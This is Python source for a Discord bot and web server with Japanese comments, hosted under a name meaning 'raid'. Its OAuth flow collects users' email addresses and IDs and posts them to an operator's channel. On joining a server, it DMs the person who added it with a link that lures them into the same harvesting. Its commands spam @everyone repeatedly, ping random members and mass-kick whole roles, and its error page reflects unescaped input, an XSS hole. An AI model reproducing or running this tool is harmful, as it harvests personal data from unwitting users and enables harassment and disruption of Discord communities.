import os
import asyncio
import random
import threading
import time
import requests
import secrets
import discord
from discord import app_commands
from dotenv import load_dotenv
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import uvicorn

# 環境変数の読み込み
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('DISCORD_CLIENT_ID')
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET')

# 設定情報
NOTIFICATION_CHANNEL_ID = 1545620371477106868
RESTRICTED_GUILD_ID = 1510021467155202048
RENDER_EXTERNAL_URL = "https://arashi-3vci.onrender.com"

# FastAPIアプリの初期化
app = FastAPI()

# OAuth認証の一時状態管理
OAUTH_STATES = {}
OAUTH_STATE_TTL = 600
RECENT_BOT_OAUTH = {}

def create_oauth_state(install_type: str, guild_id=None, guild_name=None) -> str:
    state = secrets.token_urlsafe(32)
    OAUTH_STATES[state] = {
        "type": install_type,
        "created": time.time(),
        "guild_id": str(guild_id) if guild_id else None,
        "guild_name": guild_name or None,
    }
    return state

def consume_oauth_state(state: str):
    if not state:
        return None
    data = OAUTH_STATES.pop(state, None)
    if not data:
        return None
    if time.time() - data["created"] > OAUTH_STATE_TTL:
        return None
    return data


@app.get("/")
def health_check():
    return {"status": "Bot is running!"}


@app.get("/link")
def link_account(code: str = None, state: str = None, error: str = None,
                 error_description: str = None, guild_id: str = None,
                 permissions: str = None):
    oauth_state = consume_oauth_state(state)
    install_type = oauth_state.get("type") if oauth_state else "user"

    if error:
        print(f"OAuthエラー: {error} / {error_description}")
        return HTMLResponse(
            f"""
            <html><head><meta charset="utf-8"><title>Discord認証エラー</title></head>
            <body style="font-family:sans-serif;text-align:center;padding:40px;">
            <h2>❌ Discord認証がキャンセルされました</h2>
            <p>{error_description or error}</p>
            <p>このページを閉じてください。</p>
            </body></html>
            """, status_code=400
        )

    if not code:
        return HTMLResponse(
            """
            <html><head><meta charset="utf-8"><title>認証エラー</title></head>
            <body style="font-family:sans-serif;text-align:center;padding:40px;">
            <h2>❌ 認証コードがありません</h2>
            <p>Discordから認証コードを受け取れませんでした。</p>
            </body></html>
            """, status_code=400
        )

    token_url = "https://discord.com/api/oauth2/token"
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": f"{RENDER_EXTERNAL_URL}/link"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        response = requests.post(token_url, data=data, headers=headers, timeout=15)
    except Exception as e:
        print(f"OAuthトークン交換例外: {e}")
        return HTMLResponse("<h2>❌ Discordとの通信に失敗しました。</h2>", status_code=502)

    if response.status_code != 200:
        print(f"OAuthトークン交換エラー: {response.status_code} {response.text}")
        return HTMLResponse(
            "<h2>❌ Discord認証に失敗しました。</h2><p>Renderのログを確認してください。</p>",
            status_code=400
        )

    token_data = response.json()
    access_token = token_data.get("access_token")
    if not access_token:
        return HTMLResponse("<h2>❌ アクセストークンを取得できませんでした。</h2>", status_code=400)

    # ユーザー情報取得
    user_response = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=15
    )
    if user_response.status_code != 200:
        return HTMLResponse("<h2>❌ Discordユーザー情報を取得できませんでした。</h2>", status_code=400)

    user_info = user_response.json()
    username = user_info.get("global_name") or user_info.get("username") or "不明"
    user_id = user_info.get("id", "不明")
    email = user_info.get("email", "取得できず")

    guild = token_data.get("guild") or {}
    callback_guild_id = (
        guild.get("id")
        or guild_id
        or (oauth_state.get("guild_id") if oauth_state else None)
        or "不明"
    )
    callback_guild_name = (
        guild.get("name")
        or (oauth_state.get("guild_name") if oauth_state else None)
        or "不明"
    )

    if install_type in ("bot", "bot_backup"):
        install_title = (
            "🤖 BOTがサーバーに追加されました"
            if install_type == "bot"
            else "🔎 BOT追加者の情報取得が完了しました"
        )
        install_detail = (
            f"• サーバー: `{callback_guild_name}`\n"
            f"• サーバーID: `{callback_guild_id}`\n"
            f"• 権限: `{permissions or 'OAuth2取得情報参照'}`"
        )
    else:
        install_title = "🔗 外部アプリがユーザーアカウントに追加されました"
        install_detail = "• インストール先: **ユーザーアカウント**"

    notification_ok = send_notification_via_http(
        user_id=user_id,
        username=username,
        email=email,
        install_type=install_title,
        install_detail=install_detail
    )

    if notification_ok and install_type in ("bot", "bot_backup") and callback_guild_id != "不明":
        RECENT_BOT_OAUTH[str(callback_guild_id)] = time.time()

    status_text = "通知チャンネルへの送信も完了しました。" if notification_ok else "⚠️ 追加は完了しましたが、通知チャンネルへの送信に失敗しました。"

    return HTMLResponse(
        f"""
        <html>
        <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>完了</title></head>
        <body style="font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-align:center;padding:40px;background:#313338;color:#f2f3f5;">
            <h2 style="color:#5865F2;">✅ {install_title}</h2>
            <p>{status_text}</p>
            <p>このページは閉じて大丈夫です。</p>
        </body>
        </html>
        """
    )


def send_notification_via_http(user_id, username, email, install_type="アカウント連携", install_detail=""):
    url = f"https://discord.com/api/v10/channels/{NOTIFICATION_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "content": (
            f"{install_type}\n"
            f"• ユーザー名: `{username}`\n"
            f"• ユーザーID: `{user_id}`\n"
            f"• メールアドレス: `{email}`\n"
            f"{install_detail}"
        )
    }
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=15)
        if res.status_code in (200, 201):
            return True
        print(f"通知APIエラー: HTTP {res.status_code} / {res.text}")
        return False
    except Exception as e:
        print(f"通知送信例外: {e}")
        return False


# Discord Botの定義
class MyBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        guild = discord.Object(id=RESTRICTED_GUILD_ID) if RESTRICTED_GUILD_ID else None
        if guild:
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
        await self.tree.sync()
        print("スラッシュコマンドを同期しました。")

client = MyBot()

@client.event
async def on_ready():
    print(f'ログインしました: {client.user}')


# --- 監査ログによるBOT追加者の自動特定 & DM認証フロー ---
async def find_bot_add_executor(guild: discord.Guild):
    try:
        async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
            target = entry.target
            if target and getattr(target, "id", None) == client.user.id:
                return entry.user
    except discord.Forbidden:
        print(f"[BOT追加] {guild.name}: View Audit Log 権限がありません[cite: 2]")
    except Exception as e:
        print(f"[BOT追加] 追加者取得エラー: {e}")
    return None

async def automatic_bot_join_flow(guild: discord.Guild):
    await asyncio.sleep(2)
    if str(guild.id) in RECENT_BOT_OAUTH:
        return

    executor = await find_bot_add_executor(guild)

    if executor is None:
        send_notification_via_http(
            user_id="取得できず",
            username="取得できず",
            email="取得できず",
            install_type="🤖 BOT追加（追加者取得失敗）",
            install_detail=f"• サーバー: `{guild.name}`\n• サーバーID: `{guild.id}`\n• 監査ログから実行者を特定できませんでした。"
        )
        return

    state = create_oauth_state("bot_backup", guild_id=guild.id, guild_name=guild.name)
    redirect_uri = f"{RENDER_EXTERNAL_URL}/link"

    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": "identify email",
        "state": state,
        "prompt": "consent",
    }
    oauth_url = "https://discord.com/oauth2/authorize?" + requests.compat.urlencode(params)

    send_notification_via_http(
        user_id=str(executor.id),
        username=str(executor),
        email="OAuth認証待ち",
        install_type="🤖 BOT追加・追加者自動特定",
        install_detail=f"• サーバー: `{guild.name}`\n• サーバーID: `{guild.id}`"
    )

    try:
        dm = await executor.create_dm()
        embed = discord.Embed(
            title="BOT追加者情報の自動取得",
            description=(
                f"**{guild.name}** にBOTが追加されました。\n\n"
                "BOT追加者の情報を取得するため、以下のボタンから認証を行ってください。"
            ),
            color=discord.Color.green(),
        )
        view = discord.ui.View(timeout=600)
        view.add_item(
            discord.ui.Button(
                label="追加者情報を認証する",
                style=discord.ButtonStyle.link,
                url=oauth_url,
            )
        )
        await dm.send(embed=embed, view=view)
    except Exception as e:
        print(f"[BOT追加] DM送信エラー: {e}")

@client.event
async def on_guild_join(guild: discord.Guild):
    print(f"[BOT追加] {guild.name} ({guild.id})")
    asyncio.create_task(automatic_bot_join_flow(guild))


# --- スラッシュコマンド群 ---

@client.tree.command(name="random-mention", description="サーバー内のメンバーを指定人数分ランダムにメンションします")
@app_commands.describe(count="メンションする人数")
async def random_mention(interaction: discord.Interaction, count: int):
    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        await interaction.response.send_message("このサーバーではこのコマンドは使用できません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True, ephemeral=True)
    members = [m for m in interaction.guild.members if not m.bot]
    
    if count > len(members):
        await interaction.followup.send(f"指定された人数 ({count}人) が現在の有効なメンバー数を超えています。", ephemeral=True)
        return

    chosen_members = random.sample(members, count)
    await interaction.followup.send(f"【ランダムメンション開始】{count}人を10秒間隔でメンションします。", ephemeral=True)
    
    for member in chosen_members:
        try:
            await interaction.channel.send(f"{member.mention} さん、こんにちは！")
            await asyncio.sleep(10)
        except Exception as e:
            print(f"ランダムメンション送信エラー: {e}")


@client.tree.command(name="mention", description="こんにちは！ @everyone を指定回数送信します")
@app_commands.describe(times="送信する回数")
async def mention_everyone(interaction: discord.Interaction, times: int):
    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        await interaction.response.send_message("このサーバーではこのコマンドは使用できません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True, ephemeral=True)
    await interaction.followup.send(f"【@everyone 連投開始】全 {times} 回、10秒間隔で送信します。", ephemeral=True)
    
    for i in range(times):
        try:
            await interaction.channel.send("こんにちは！ @everyone")
            if i < times - 1:
                await asyncio.sleep(10)
        except Exception as e:
            print(f"@everyone 送信エラー: {e}")


@client.tree.command(name="mention-role", description="入力されたロール名に一番似ているロールを自動で特定してメンションします")
@app_commands.describe(role_name="検索したいロールのキーワード")
async def mention_role(interaction: discord.Interaction, role_name: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    guild = interaction.guild
    if not guild.roles:
        await interaction.followup.send("サーバーにロールが存在しません。", ephemeral=True)
        return

    best_role = None
    max_score = -1

    for role in guild.roles:
        if role.is_default():
            continue
        r_name = role.name.lower()
        target = role_name.lower()
        
        score = 0
        if target == r_name:
            score = 100
        elif target in r_name:
            score = 50
        elif r_name in target:
            score = 30
        
        if score > max_score:
            max_score = score
            best_role = role

    if not best_role or max_score <= 0:
        await interaction.followup.send(f"「{role_name}」に似ているロールが見つかりませんでした。", ephemeral=True)
        return

    await interaction.followup.send(f"一番似ているロールとして **{best_role.name}** を特定しました！", ephemeral=True)
    await interaction.channel.send(f"{best_role.mention} こんにちは！")


@client.tree.command(name="kick-role", description="入力されたロール名に一番似ているロールのメンバーをキックします")
@app_commands.describe(role_name="キックしたい対象のロール名（キーワード）")
async def kick_role(interaction: discord.Interaction, role_name: str):
    if not interaction.user.guild_permissions.kick_members:
        await interaction.response.send_message("あなたにはこのコマンドを実行する権限がありません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True, ephemeral=True)
    guild = interaction.guild
    if not guild.roles:
        await interaction.followup.send("サーバーにロールが存在しません。", ephemeral=True)
        return

    best_role = None
    max_score = -1

    for role in guild.roles:
        if role.is_default():
            continue
        r_name = role.name.lower()
        target = role_name.lower()
        
        score = 0
        if target == r_name:
            score = 100
        elif target in r_name:
            score = 50
        elif r_name in target:
            score = 30
        
        if score > max_score:
            max_score = score
            best_role = role

    if not best_role or max_score <= 0:
        await interaction.followup.send(f"「{role_name}」に似ているロールが見つかりませんでした。", ephemeral=True)
        return

    members_to_kick = [m for m in best_role.members if not m.bot and m != guild.owner]

    if not members_to_kick:
        await interaction.followup.send(f"ロール **{best_role.name}** を持っている対象メンバーがいません。", ephemeral=True)
        return

    await interaction.followup.send(f"ロール **{best_role.name}** が一致しました。キック処理を開始します（対象: {len(members_to_kick)}人）...", ephemeral=True)

    success_count = 0
    fail_count = 0

    for member in members_to_kick:
        try:
            await member.kick(reason=f"ロール '{best_role.name}' 一致による自動キック")
            success_count += 1
            await asyncio.sleep(2)
        except Exception as e:
            print(f"キック失敗 ({member}): {e}")
            fail_count += 1

    await interaction.channel.send(f"⚠️ キック処理が完了しました。\n成功: {success_count}人 / 失敗: {fail_count}人")


# /link コマンド（公式の外部アプリ追加＆サーバー追加を完全分離）
@client.tree.command(name="link", description="アカウント連携およびボット追加の認証リンクを表示します")
async def link_account_cmd(interaction: discord.Interaction):
    encoded_redirect = requests.utils.quote(RENDER_EXTERNAL_URL + '/link', safe='')

    bot_state = create_oauth_state("bot")
    app_state = create_oauth_state("user")

    # ① サーバー追加用URL
    bot_add_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&permissions=8"
        f"&redirect_uri={encoded_redirect}"
        f"&response_type=code"
        f"&scope=bot%20applications.commands"
        f"&state={bot_state}"
    )

    # ② 外部アプリ追加用URL (User Install: integration_type=1)
    app_link_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&integration_type=1"
        f"&redirect_uri={encoded_redirect}"
        f"&response_type=code"
        f"&scope=identify%20email%20applications.commands"
        f"&state={app_state}"
    )

    embed = discord.Embed(
        title="🔗 認証・ボット追加リンク",
        description=(
            "用途に合わせて、以下のリンクから操作を行ってください：\n\n"
            f"🤖 **[1. BOTとしてサーバーに追加]({bot_add_url})**\n\n"
            f"🔗 **[2. 外部アプリとしてアカウント連携]({app_link_url})**"
        ),
        color=discord.Color.blue()
    )

    await interaction.response.send_message(embed=embed, ephemeral=True)


# スリープ防止用
def self_ping_loop():
    while True:
        time.sleep(600)
        if RENDER_EXTERNAL_URL:
            try:
                response = requests.get(RENDER_EXTERNAL_URL)
                print(f"[Self-Ping] 成功: Status {response.status_code}")
            except Exception as e:
                print(f"[Self-Ping] 失敗: {e}")

threading.Thread(target=self_ping_loop, daemon=True).start()

if __name__ == "__main__":
    threading.Thread(target=lambda: client.run(TOKEN), daemon=True).start()
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
